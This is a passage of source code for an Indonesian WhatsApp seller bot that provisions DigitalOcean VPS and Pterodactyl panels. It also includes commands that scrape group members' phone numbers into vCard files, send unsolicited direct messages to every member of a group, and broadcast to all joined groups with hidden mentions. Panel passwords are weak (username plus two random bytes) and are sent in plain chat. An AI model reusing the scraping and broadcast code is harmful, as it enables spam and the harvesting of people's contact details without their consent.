            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Sky.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//================================================================================

case "1gb-private": case "2gb-private": case "3gb-private": case "4gb-private": case "5gb-private": case "6gb-private": case "7gb-private": case "8gb-private": case "9gb-private": case "10gb-private": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Akses(mess.owner)
if (!m.isGroup) return Reply(`Khusus dalam grub`)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-private") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-private") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-private") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-private") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-private") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-private") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-private") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-private") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-private") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-private") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Akses(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Akses(mess.owner)
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n\`${status}\`
* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Sky.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": case "delp-v2": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "11gb": case "12gb": case "13gb": case "14gb": case "15gb": case "16gb": case "17gb": case "18gb": case "19gb": case "20gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Akses(mess.prem)
if (!m.isGroup) return Akses(mess.group)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix + command} username,nomerbuyyer
Contoh:
${prefix + command} asep,6289999999999`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0]
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else if (command == "11gb") {
ram = "11000"
disknya = "11000"
cpu = "240"
} else if (command == "12gb") {
ram = "12000"
disknya = "12000"
cpu = "260"
} else if (command == "13gb") {
ram = "13000"
disknya = "13000"
cpu = "280"
} else if (command == "14gb") {
ram = "14000"
disknya = "14000"
cpu = "300"
} else if (command == "15gb") {
ram = "15000"
disknya = "15000"
cpu = "320"
} else if (command == "16gb") {
ram = "16000"
disknya = "16000"
cpu = "340"
} else if (command == "17gb") {
ram = "17000"
disknya = "17000"
cpu = "360"
} else if (command == "18gb") {
ram = "18000"
disknya = "18000"
cpu = "380"
} else if (command == "19gb") {
ram = "19000"
disknya = "19000"
cpu = "400"
} else if (command == "20gb") {
ram = "20000"
disknya = "20000"
cpu = "420"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now()) + " NO DEL NO INTIP"
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply(`*Berhasil membuat panel✅*
Data akun sudah dikirim ke nomor tujuan
*RAM:* ${ram}MB
*CPU:* ${cpu}%
`)
} else {
orang = m.chat
}
const url1 = `https://files.catbox.moe/nigm5a.jpeg`;
async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: Sky.waUploadToServer
 });
 return imageMessage;
}
let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `📦 Data Panel ${ram}MB Telah sampai...` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: `*Berhasil Membuat Akun Panel ✅*
_Di pakai yaa... Soalnya kalo panel nya off akan di delete_

* *ID Server :* ${user.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Ram :* ${ram}MB
* *Cpu :* ${cpu}%
* *Disk :* ${disknya}MB

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
* Claim Garansi Ga bawa bukti? No Respon!` },
 nativeFlowMessage: {
 buttons: [{                  
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Coppy Uername\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{                  
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Coppy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{                  
"name": "cta_url",
"buttonParamsJson":  `{\"display_text\":\"Link To Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
},
 ],
 },
 },

 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await Sky.relayMessage(u, msg.message, {
 messageId: msg.key.id,
});
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator) return Akses(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator) return Akses(mess.owner)
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n\`${status}\`
* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Sky.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": case "delp": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Akses(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Sky.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Sky.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Akses(mess.owner)
if (!m.isGroup) return Akses(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Sky.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Akses(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Sky.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Sky.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Sky.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Sky.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Akses(mess.owner)
if (!m.isGroup) return Akses(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Sky.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Sky.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Sky.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Sky.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmhidetag": case "jpmht": case "jpmh": {
if (!isCreator) return Akses(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {text: `${teks}`, mentions: allgrup[i].participants.map(e => e.id)}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//===============================================================================

case "jpmht2": case "jpmh2": case "jpmhidetag2": {
if (!isCreator) return Akses(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {image: fs.readFileSync(rest), caption: teks, mentions: allgrup[i].participants.map(e => e.id)}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Akses(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Akses(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Akses(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
